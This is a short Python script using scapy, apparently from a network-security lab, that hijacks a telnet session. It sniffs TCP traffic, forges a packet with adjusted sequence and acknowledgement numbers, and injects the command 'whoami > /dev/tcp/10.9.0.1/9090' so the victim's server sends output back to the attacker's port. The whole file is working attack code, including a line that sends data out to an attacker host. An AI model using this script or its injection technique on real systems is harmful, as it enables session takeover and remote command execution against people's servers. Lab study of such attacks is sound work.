from scapy.all import *

import subprocess
cmd = "ip a | grep 10.9.0.1 | awk '{print $7}'"
IFACE = subprocess.run(cmd, shell=True, check=True, universal_newlines=True, stdout=subprocess.PIPE).stdout.strip()
attacker_ip = "10.9.0.1" # attacker's IP
attacker_port = 9090 # a (not already used) port of your choice
victim_ip = "10.9.0.5" # the IP of the user receiving the telnet connection (server)


def automatic_hijacking():
    print("*** Hijacking Automatic Mode ***")
    print("Start sniffing...")
    sniff(iface=IFACE, filter="tcp", prn=_hijacking)


def _hijacking(pkt):
    if pkt[IP].src==victim_ip and Raw in pkt:
        print("Got a starting of a session, hijacking... ", end="")
        # you have to get the size of the data field to update SEQ and ACK.
        # this value is generally 1 since telnet sends one character at the time
        # but sometimes it is different (for instance, 2, if also \r is sent)
        tcp_seg_len = len(pkt.getlayer(Raw).load)

        ip = IP(src=pkt[IP].src, dst=pkt[IP].dst)
        tcp = TCP(sport=pkt[TCP].sport, dport=pkt[TCP].dport, flags="A", seq=pkt[TCP].seq+tcp_seg_len, ack=pkt[TCP].ack+tcp_seg_len)
        data = f"\r whoami > /dev/tcp/{attacker_ip}/{attacker_port} \r" # use this to send back the name of the user
        pkt = ip/tcp/data
        send(pkt, iface=IFACE, verbose=0)
        print("done.")
        exit(0)

automatic_hijacking()
